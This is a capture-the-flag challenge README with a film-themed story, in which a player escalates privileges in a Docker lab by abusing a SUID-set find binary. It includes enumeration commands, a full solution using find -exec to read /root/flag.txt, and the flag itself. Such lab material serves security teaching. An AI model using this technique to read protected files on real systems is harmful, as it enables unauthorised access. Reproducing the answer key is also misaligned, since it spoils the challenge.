# Challenge 1  SUID Binary Abuse

**Difficulty:** Easy  
**Category:** Linux Privilege Escalation  
**Flag:** hidden in `/root/flag.txt`

---

## Story

You and Dr. King Schultz have ridden through the night to reach Candie's plantation.
The gate overseer stepped away. You slip through and find yourself at a terminal
inside the gatehouse — logged in as a low-privileged worker.

Candie's private papers are locked away in the master's quarters (`/root/flag.txt`).
Somewhere on this system, a binary was given more power than it should have.
Find it. The gate is open — the rest is up to you.

---

## Setup

```bash
# Build the Docker image
docker build -t ctf-linux-easy-1 .

# Start the container (interactive shell as 'player')
docker run -it --rm ctf-linux-easy-1
```

You are now `player`. Your goal: read `/root/flag.txt`.

---

## Hints

<details>
<summary>Hint 1</summary>
SUID (Set User ID) means a binary runs as its owner, not the person who runs it.
If a root-owned binary has SUID set, it runs as root  even when you execute it.
</details>

<details>
<summary>Hint 2</summary>
Find all SUID binaries on the system:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Look for something that shouldn't have SUID.
</details>

<details>
<summary>Hint 3</summary>
Check GTFOBins (https://gtfobins.github.io)  it lists how to exploit common binaries when they have SUID set.
</details>

---

## Solution

<details>
<summary>Click to reveal  try on your own first!</summary>

### Step 1  Find SUID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

You'll spot `/usr/bin/find` in the list  this is unusual.

### Step 2  Use `find` to execute a command as root

`find` supports `-exec`, which runs a command. Because `find` has SUID and is owned by root, that command runs as root:

```bash
find /root/flag.txt -exec cat {} \;
```

### Result

```
CTF{su1d_b1n4ry_1s_d4ng3r0us}
```

### Why this works

The SUID bit on `find` causes it to execute with root privileges regardless of who runs it. The `-exec` flag lets you run arbitrary commands in that root context. This is why SUID should only be set on binaries that genuinely need it (like `passwd`).

</details>
